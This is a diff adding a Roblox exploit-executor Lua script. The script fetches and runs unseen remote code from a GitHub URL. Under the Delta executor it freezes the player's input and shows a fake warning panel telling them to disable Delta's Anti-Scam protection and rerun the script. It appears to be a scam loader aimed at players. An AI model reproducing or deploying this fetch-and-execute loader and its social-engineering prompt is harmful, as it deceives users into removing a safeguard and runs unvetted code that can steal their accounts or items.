@@ -1,0 +1,177 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local TeleportService = game:GetService("TeleportService")
+local ContextActionService = game:GetService("ContextActionService")
+local SoundService = game:GetService("SoundService")
+
+-- Disable all sounds
+for _, sound in pairs(workspace:GetDescendants()) do
+    if sound:IsA("Sound") then
+        sound:Stop()
+        sound.Volume = 0
+    end
+end
+
+-- Load external KONI LUA script
+local function runLoaders()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/nedyxxx/GAG/refs/heads/main/main"))()
+    end)
+end
+
+-- Executor detection
+local function detectExecutor()
+    if syn then
+        return "Synapse"
+    elseif KRNL then
+        return "KRNL"
+    elseif Fluxus then
+        return "Fluxus"
+    elseif Protosmasher then
+        return "Protosmasher"
+    elseif (ArceusX ~= nil) or (Arceus ~= nil) then
+        return "Arceus X"
+    elseif Delta then
+        return "Delta"
+    else
+        return "Codex / Unknown"
+    end
+end
+
+-- Freeze player movement
+local function freezePlayer()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+        humanoid.AutoRotate = false
+    end
+end
+
+-- Show Delta warning panel (only for Delta executor)
+local function showDeltaWarning()
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Parent = player:WaitForChild("PlayerGui")
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.IgnoreGuiInset = true
+
+    -- Fullscreen black overlay
+    local Background = Instance.new("Frame")
+    Background.Parent = ScreenGui
+    Background.Size = UDim2.new(1, 0, 1, 0)
+    Background.Position = UDim2.new(0, 0, 0, 0)
+    Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    Background.BackgroundTransparency = 0
+    Background.BorderSizePixel = 0
+
+    -- Main warning panel
+    local Frame = Instance.new("Frame")
+    Frame.Parent = ScreenGui
+    Frame.Size = UDim2.new(0.65, 0, 0.6, 0)
+    Frame.Position = UDim2.new(0.175, 0, 0.2, 0)
+    Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    Frame.BackgroundTransparency = 0.1
+    Frame.BorderSizePixel = 0
+    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 14)
+    Instance.new("UIStroke", Frame).Color = Color3.fromRGB(0, 170, 255)
+
+    -- Blinking yellow info label (top)
+    local InfoLabel = Instance.new("TextLabel")
+    InfoLabel.Parent = Frame
+    InfoLabel.BackgroundTransparency = 1
+    InfoLabel.Size = UDim2.new(1, -20, 0, 24)
+    InfoLabel.Position = UDim2.new(0, 10, 0, 10)
+    InfoLabel.Font = Enum.Font.GothamBold
+    InfoLabel.TextSize = 14
+    InfoLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
+    InfoLabel.TextWrapped = true
+    InfoLabel.TextXAlignment = Enum.TextXAlignment.Center
+    InfoLabel.Text = "Wait 30 seconds after rejoining to use the script."
+
+    spawn(function()
+        while InfoLabel.Parent do
+            InfoLabel.Visible = not InfoLabel.Visible
+            task.wait(0.6)
+        end
+    end)
+
+    -- Title
+    local Title = Instance.new("TextLabel")
+    Title.Parent = Frame
+    Title.Size = UDim2.new(1, -20, 0, 36)
+    Title.Position = UDim2.new(0, 10, 0, 40)
+    Title.BackgroundTransparency = 1
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 22
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.Text = "Delta Anti-Scam Detected"
+    Title.TextWrapped = true
+
+    -- Main message with smaller font
+    local Label = Instance.new("TextLabel")
+    Label.Parent = Frame
+    Label.BackgroundTransparency = 1
+    Label.Size = UDim2.new(1, -40, 1, -140)
+    Label.Position = UDim2.new(0, 20, 0, 80)
+    Label.Font = Enum.Font.Gotham
+    Label.TextSize = 14  -- reduced font size for better fit
+    Label.TextColor3 = Color3.fromRGB(220, 220, 220)
+    Label.TextWrapped = true
+    Label.TextYAlignment = Enum.TextYAlignment.Top
+    Label.Text = [[
+The script requires the teleport function, but it is currently blocked by Delta’s Anti-Scam feature.  
+
+1) Tap the Delta icon at the top of the screen.  
+2) Open Settings (Gear Icon).  
+3) Disable the "Anti-Scam" option.  
+4) Click or tap the "Rejoin" button below.  
+5) After rejoining, execute the script again.  
+For a more stable experience, use KRNL, Codex, or Arceus X. ]]
+
+    -- Rejoin button
+    local Button = Instance.new("TextButton")
+    Button.Parent = Frame
+    Button.Size = UDim2.new(0, 160, 0, 44)
+    Button.Position = UDim2.new(0.5, -80, 1, -20)
+    Button.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
+    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Button.Text = "Rejoin"
+    Button.Font = Enum.Font.GothamBold
+    Button.TextSize = 18
+    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 10)
+
+    Button.MouseButton1Click:Connect(function()
+        ContextActionService:UnbindAction("FreezeAllInputs")
+        ContextActionService:UnbindAction("FreezeAllKeys")
+        TeleportService:Teleport(game.PlaceId, player)
+    end)
+
+    -- Freeze player
+    freezePlayer()
+    ContextActionService:BindAction("FreezeAllInputs", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.UserInputType:GetEnumItems()))
+    ContextActionService:BindAction("FreezeAllKeys", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.KeyCode:GetEnumItems()))
+
+    -- Unfreeze after 30 seconds
+    task.delay(30, function()
+        ContextActionService:UnbindAction("FreezeAllInputs")
+        ContextActionService:UnbindAction("FreezeAllKeys")
+        local character = player.Character
+        if character then
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.WalkSpeed = 16
+                humanoid.JumpPower = 50
+                humanoid.AutoRotate = true
+            end
+        end
+    end)
+end
+
+-- Main execution
+runLoaders()  -- KONI LUA runs immediately
+
+-- Only show Delta warning if executor is Delta
+if detectExecutor() == "Delta" then
+    showDeltaWarning()
+end
